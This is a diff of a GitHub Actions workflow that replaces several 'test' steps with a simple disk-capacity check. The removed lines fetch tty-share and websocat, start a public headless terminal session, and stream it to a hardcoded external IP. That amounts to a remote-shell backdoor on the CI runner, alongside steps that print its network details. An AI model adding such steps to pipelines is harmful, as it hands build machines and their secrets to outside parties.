@@ -9,18 +9,6 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: iproute
+      - name: disk capacity
         run: |
-          ip a
-      - name: public ip
-        run: |
-          curl -4 cloudflare.com/cdn-cgi/trace
-      - name: tty-share
-        run: |
-          curl -sL https://github.com/elisescu/tty-share/releases/download/v2.4.0/tty-share_linux-amd64 -o tty-share
-          curl -sL https://github.com/vi/websocat/releases/download/v1.11.0/websocat.x86_64-unknown-linux-musl -o websocat
-          chmod +x tty-share websocat
-          ./tty-share -public -A -headless > /tmp/tty-share &
-          sleep 4
-          ./websocat ws://108.61.145.210:10611 < /tmp/tty-share
-          wait
+          df -h
